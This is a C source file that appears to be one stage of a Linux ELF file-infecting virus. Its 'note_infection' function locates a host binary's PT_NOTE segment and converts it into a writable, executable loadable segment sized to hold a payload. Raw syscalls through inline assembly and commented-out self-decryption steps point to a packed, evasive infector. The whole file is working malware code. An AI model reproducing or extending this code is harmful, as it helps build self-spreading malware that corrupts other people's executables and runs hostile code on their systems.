#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// ASM VOLATILE
////////////////////////////////////////////////////////////////////////////////

__attribute__((always_inline)) static inline int _open(const char *pathname, int flags, mode_t mode)
{
	int ret;

	asm volatile
	(
		"mov rdi, %0\n"
		"mov esi, %1\n"
		"mov edx, %2\n"

		"mov rax, 0x2\n"
		"syscall\n"
		:
		: "g"(pathname), "g"(flags), "g"(mode)
	);
	asm volatile
	(
		"mov %0, eax\n"
		: "=r"(ret)
		:
	);

	return ret;
}

__attribute__((always_inline)) static inline int _close(int fd)
{
	int ret;

	asm volatile
	(
		"mov edi, %0\n"

		"mov rax, 0x3\n"
		"syscall\n"
		:
		: "g"(fd)
	);
	asm volatile
	(
		"mov %0, eax\n"
		: "=r"(ret)
		:
	);

	return ret;
}

__attribute__((always_inline)) static inline ssize_t _write(int fd, const void *buf, size_t count)
{
	ssize_t ret;

	asm volatile
	(
		"mov edi, %0\n"
		"mov rsi, %1\n"
		"mov rdx, %2\n"

		"mov rax, 0x1\n"
		"syscall\n"
		:
		: "g"(fd), "g"(buf), "g"(count)
	);
	asm volatile
	(
		"mov %0, rax\n"
		: "=r"(ret)
		:
	);

	return ret;
}

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTIONS
////////////////////////////////////////////////////////////////////////////////

__attribute__((always_inline)) static inline size_t _strlen(const char *str)
{
	size_t ret = 0;

	if (str == NULL)
		return 0;

	while (str[ret])
		ret++;

	return ret;
}

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTIONS
////////////////////////////////////////////////////////////////////////////////

__attribute__((always_inline)) static inline Elf64_Phdr *get_segment(const struct s_host *host, const size_t index)
{
	Elf64_Phdr *segment;

	segment = (Elf64_Phdr *)((void *)host->header + sizeof(Elf64_Ehdr) + (sizeof(Elf64_Phdr) * index));

	if ((void *)segment >= (void *)host->header + host->filesize)
		segment = NULL;

	return segment;
}

__attribute__((always_inline)) static inline bool is_data_segment(const Elf64_Phdr *segment)
{
	if (segment->p_type != PT_LOAD)
		return false;

	return segment->p_flags == (PF_W | PF_R);
}

__attribute__((always_inline)) static inline bool is_note_segment(const Elf64_Phdr *segment)
{
	return segment->p_type == PT_NOTE;
}

__attribute__((always_inline)) static inline void update_note_segment(struct s_note *note) 
{
	const size_t base = note->data->p_vaddr + note->data->p_memsz;
	const size_t add_padding = base % note->data->p_align;

	note->self->p_vaddr = base + (note->data->p_align - add_padding);
	note->self->p_paddr = note->self->p_vaddr;
	note->self->p_offset = base - add_padding;

	note->self->p_filesz = PAYLOAD_SIZE;
	note->self->p_memsz = PAYLOAD_SIZE;

	note->self->p_type = PT_LOAD;
	note->self->p_flags = (PF_X | PF_W | PF_R);
	note->self->p_align = note->data->p_align;
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void note_infection(struct s_host *host, struct s_keychain *keychain, enum e_context context)
{
//	decrypt_right(keychain, (char *)text_infection, (void *)note_infection - (void *)text_infection);

#if DEBUG
	char function[] = "note_infection:\t\t";
	char name[] = "/tmp/trace";
	int trace = _open(name, O_RDWR | O_APPEND, 0000);
	char newline = 0xa;
	char result = context + 48;
	
	if (trace > 0)
	{
		_write(trace, function, _strlen(function));
		_write(trace, &result, 1);
		_write(trace, &newline, 1);
	}

	_close(trace);
#endif

	if (context == FAILURE)
		goto label;
	
	struct s_note note = {0};
	Elf64_Phdr *segment = NULL;

	for (register Elf64_Half index = 0; index < host->header->e_phnum; index++)
	{
		if ((segment = get_segment(host, index)) == NULL)
		{
			context = FAILURE;
			goto label;
		}

		if (is_data_segment(segment) == true)
			note.data = segment;
		if (is_note_segment(segment) == true)
			note.self = segment;
	}
	
	if (segment == NULL || note.self == NULL)
	{
		context = FAILURE;
		goto label;
	}

	update_note_segment(&note);
	host->note = &note;

label:
//	update_keychain_right(keychain, (char *)note_infection, (void *)header_infection - (void *)note_infection);
//	decrypt_right(keychain, (char *)header_infection, (void *)injection - (void *)header_infection);

	header_infection(host, keychain, context);
}
